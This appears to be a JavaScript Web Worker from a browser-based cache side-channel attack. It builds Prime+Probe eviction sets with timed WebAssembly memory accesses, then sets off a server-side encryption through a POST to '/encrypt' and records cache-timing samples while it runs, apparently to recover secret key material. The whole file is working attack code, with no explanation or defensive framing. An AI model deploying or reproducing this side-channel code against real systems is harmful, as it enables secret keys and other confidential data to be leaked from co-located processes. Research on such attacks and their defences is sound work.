function encrypt() {
    console.log("calling encrypt");
    fetch("/encrypt", { method: "POST" }).then(() =>
        console.log("encrypt done!"),
    );
}

let memDataView = null;

function getTime() {
    return memDataView.getBigUint64(0, true);
}

function wait(n) {
  for(let i = 0; i < n; i++) {}
}

class EvictionSetGenerator {
    constructor(dataView, config) {
        this.config = config;
        this.candidatePoolPtr = config.page_size;
        this.candidatePoolSize = config.num_candidates * config.page_size;
        this.dataView = dataView;
    }
    measureTimedMiss(timed_miss, probe, evsetPtr) {
        const t = Number(getTime());
        for (let i = 0; i < this.config.num_measurements; i++) {
            timed_miss(evsetPtr, probe);
        }
        return (Number(getTime()) - t) / this.config.num_measurements;
    }
    setupLinkedList(indices) {
        if (indices.length == 0) {
            return;
        }
        let pre = indices[0];
        for (let i = 1; i < indices.length; i++) {
            this.dataView.setUint32(pre, indices[i], true);
            pre = indices[i];
        }
        this.dataView.setUint32(pre, 0, true);
        return indices[0];
    };
    generateCandidateSet(target, timed_miss) {
        const pageOffset = target & ((~(this.config.page_size - 1)) >>> 0);
        let evicted = false;
        let indices = [];
        do {
            indices = new Array(this.config.num_candidates);
            for (let i = 0; i < indices.length; i++) indices[i] = this.candidatePoolPtr + (i * this.config.page_size) + pageOffset;
            for (let i = 0; i < indices.length; i++) {
                const to_swap = Math.random() * (indices.length - 1);
                const tmp = indices[i];
                indices[i] = indices[to_swap];
                indices[to_swap] = tmp;
            }
            this.setupLinkedList(indices);
            if (target) {
                let t = this.measureTimedMiss(timed_miss, target, indices[0]);
                console.log(t)
                evicted = this.config.threshold < t;
            }
        } while (target && !evicted);
        for (let i = 0; i < indices.length; i++) indices[i] -= pageOffset;
        return indices;
    };
    relinkChunk(evset, removedChunks) {
        const chunk = removedChunks.pop()
        // point last evset element to first chunk element
        this.dataView.setUint32(evset[evset.length-1], chunk[0], true);
        evset = evset.concat(chunk); 
        return [evset, removedChunks]
    }
    unlinkChunk(evset, removedChunks, nchunks, chunk_idx) {
        nchunks = evset.length < nchunks ? evset.length : nchunks;
        const chunkSize = evset.length / nchunks;
        const isLastChunk = chunk_idx == (nchunks - 1);
        const chunkHead = nchunks * chunk_idx;
        const thisChunkSize = isLastChunk ? evset.length - chunkHead : chunkSize;
        const newChunk = evset.splice(chunkHead, thisChunkSize);
        removedChunks = removedChunks.concat(newChunk);
        if(chunk_idx != 0 ) {
            this.dataView.setUint32(evset[chunkHead - 1], isLastChunk ? 0 : evset[chunkHead + chunkSize], true);
        }
        this.dataView.setUint32(newChunk[newChunk.length - 1], 0, true);
        return [evset, removedChunks]
    }
    reduceToEvictionSet(timed_miss, candidates, probe) {
        const pageOffset = probe & ((~(this.config.page_size - 1)) >>> 0);
        let evset = candidates;
        for(let i = 0; i < evset.length; i++) evset[i] += pageOffset;
        let removedChunks = [];
        this.setupLinkedList(evset);
        let backtrackCounter = 0;
        let level = 0;
        const nchunks = this.config.associativity + 1;
        while(evset.length > this.config.associativity) {
            let found = false;
            let i = 0;
            for(; i < nchunks; i++) {
                [evset, removedChunks] = this.unlinkChunk(evset, removedChunks, nchunks, i);
                let t = this.measureTimedMiss(timed_miss, probe, evset[0]);
                if(t < this.config.threshold) {
                    [evset, removedChunks] = this.relinkChunk(evset, removedChunks);
                } else {
                    level++;
                    found = true;
                    break;
                }
            }
            if(!found) {
                backtrackCounter++;
                if(level && (!this.config.num_backtracks || backtrackCounter < this.config.num_backtracks)) {
                    [evset, removedChunks] = this.relinkChunk(evset, removedChunks);
                    level--;
                    if(removedChunks.length == 0) break;
                }
            } else {
                while(removedChunks.length > 0) {
                    [evset, removedChunks] = this.relinkChunk(evset, removedChunks);
                }
                break;
            }
        }
        return evset;
    }
    generateConflictSet(evsets) {
        let set = new Set(evsets[0]);
        for(let i = 1; i < evsets.length; i++) {
            for(let j = 0; j < evsets[i].length; j++) {
                set.add(evsets[i][j]);
            }
        }
        return this.setupLinkedList(Array.from(set));
    }
}

self.onmessage = async (event) => {
    const { memory, utils, config } = event.data;
    const wasmUtils = new WebAssembly.Instance(utils, {
        env: {
            memory: memory,
        },
    });
    memDataView = new DataView(memory.buffer);

    const evGenerator = new EvictionSetGenerator(memDataView, config);
    console.log("evGenerator created")
    const candidates = evGenerator.generateCandidateSet(config.probe[0], wasmUtils.exports.timed_miss);
    console.log("candidate set created with size: ", candidates.length);

    const evsets = new Array(config.probe.length);
    for(let i = 0; i < evsets.length; i++) {
        evsets[i] = evGenerator.reduceToEvictionSet(wasmUtils.exports.timed_miss, candidates, config.probe[i])
        console.log("evset[", i, "] created with size: ", evsets[i].length);
    }
    console.log(evsets);
    const conflictSet = evGenerator.generateConflictSet(evsets);
    console.log(conflictSet)
    console.log("conflict set created with size: ", conflictSet.length);
    const total_num_results = config.time_slots * config.probe.length;
    const results = new Uint32Array(total_num_results);
    encrypt();

    for(let i = 0; i < total_num_results; i += config.probe.length) {
        const startTime = getTime()
        for(let j = 0; j < config.probe.length; j++) {
            results[i + j] = Number(wasmUtils.exports.timed_access(config.probe[j]));
        }
        wasmUtils.exports.evict(conflictSet[0]);
        do {
            wait(config.wait_cycles);
        } while (getTime() - startTime < config.time_slot_size);
    }
    self.postMessage(results);
};
